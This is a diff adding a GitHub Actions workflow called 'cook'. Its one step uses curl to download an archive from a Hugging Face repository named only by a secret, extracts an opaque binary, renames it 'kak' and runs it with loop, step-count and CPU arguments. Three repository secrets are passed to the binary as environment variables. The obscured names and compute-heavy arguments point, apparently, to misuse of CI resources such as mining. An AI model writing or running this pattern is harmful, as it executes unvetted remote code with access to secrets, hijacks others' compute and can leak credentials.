@@ -1,0 +1,39 @@
+name: cook
+
+env:
+  REPO_DIR: ${{ github.workspace }}
+  HGTR: 'huggingface'
+  TAAAG: v1.0.0_${{ github.event.inputs.amd_override }}
+  LUP: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  HF_REPO: ${{ secrets.HF_REPO }}
+
+on:
+  workflow_dispatch:
+    inputs:
+      amd_override:
+        description: '1'
+        required: false
+        default: 'v3'
+        type: string
+      loop_override:
+        description: '2'
+        required: false
+        default: '10'
+        type: string
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Cook
+        timeout-minutes: 44
+        run: |
+          curl -o kake.7z -L --url "https://${{ env.HGTR }}.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TAAAG }}.7z?download=true"
+          7z x kake.7z && rm -rf kake.7z
+          mv doit kak && chmod +x kak && chmod +x kak
+          ./kak loop ${{ env.LUP }} steps 1000000 wait 0 cpu 3
